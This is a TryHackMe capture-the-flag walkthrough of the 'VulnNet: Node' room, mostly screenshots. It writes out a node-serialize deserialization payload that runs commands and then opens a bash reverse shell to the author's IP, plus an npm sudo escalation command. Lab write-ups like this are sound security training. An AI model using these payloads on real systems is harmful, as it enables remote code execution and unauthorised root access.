 Link room: https://tryhackme.com/room/vulnnetnode
 # ENUMERATING
 ## using nmap
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/56567621-f629-4f71-96c1-23621afbf812)

## using ffuf
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/4d9572ab-e8bf-429e-aa27-214991d78024)

## view web (port 8080)
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/af588c4a-9c35-443d-be90-0752fdd8789a)
# EXPLOITING
## using burpsuite
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c3570c6f-56ad-4c57-a3af-88b8569e3440)

Decode with base64
 
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/2bc795b2-18c1-4c47-8f35-2d09c07200d0)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/620b4127-a0eb-4ada-9bbe-ca4d768ca295)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/9574b0dd-fce5-4b5b-8e90-5c64333ee0d2)

edit: ```_$$ND_FUNC$$_function (){require('child_process').exec('ping -c 3 10.9.218.234', function(error, stdout, stderr) { console.log(stdout) });}()```

Encode with base64

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/384b3b81-caa4-4c00-a3f2-debb332fae49)

Then I use BurpSuite to send it 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6a694f9b-3815-4077-a9fa-b39e53837f07)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e8d0f73d-4b05-41d2-8cc8-09c6b7c82795)

=> Nice!!! It's worked. 

edit: ```{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.9.218.234/1234 0>&1\"', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":true,"encoding": "utf-8"}```

I continue to encode with base 64 and sent it

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/d9bb5026-e1ee-454f-bdea-cc7ca9f91fe5)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/61a4b2ef-6186-4b12-938b-751a2ae7cafd)


![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8f3b8a18-2612-41d9-b8fe-c0e7636e1f7a)

=> I get a shell but I receive a message "bash: no job control in this shell".So I fix it with a few familiar commands

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/f461fb1a-1215-47c7-9645-03b520364331)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/1d51a29a-4b9d-4e33-a017-d28f96db876d)

=> Go to GTFOBins and I find it 

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/03d81b6e-77cd-427b-983b-445994c5e9a8)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8a202fb5-265d-47f8-a2bd-2b8186af6796)

then I execute the command ``` sudo -u serv-manage /usr/bin/npm -C exploit/ --unsafe-perm i```

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/1096b819-ba79-46f9-ba77-3c4679ba98a9)

 # PRIVILEGE ESCALATION
 ## using sudo -l to check permission
 
 ![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6d686f26-4055-41c1-9b01-0ad6d2347bd4)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/a27696aa-a441-47a5-b1fb-1be26c848171)

I edit "vulnnet-job.service" file to get reverse shell

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/76839a9a-0110-45b2-a607-f110772b6076)

I excute 3 command with sudo permission

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6130b089-b4bf-4b69-86e2-3348a7ee5e1b)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6f18a854-d8e9-42b9-af48-e6b338543bac)

=> I get root shell

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/9be8bac1-931f-4904-9a8d-32fbc18bb7e8)

=> user.txt

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/5e5c5811-ee0f-4613-b428-f55ea97e6207)

=> root.txt
 ## Done!!!
 Thanks for reading. Bye!
